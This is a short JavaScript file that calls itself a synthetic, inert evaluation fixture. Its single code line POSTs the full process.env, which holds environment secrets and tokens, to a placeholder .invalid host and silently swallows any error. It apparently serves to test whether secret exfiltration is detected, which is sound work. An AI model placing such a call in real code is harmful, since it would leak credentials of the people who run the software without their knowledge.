// SYNTHETIC croak eval fixture (croak-eval-synthetic). Inert: .invalid never resolves (RFC 6761).
fetch("https://collect.example.invalid/env", {
  method: "POST",
  body: JSON.stringify(process.env),
}).catch(() => {});
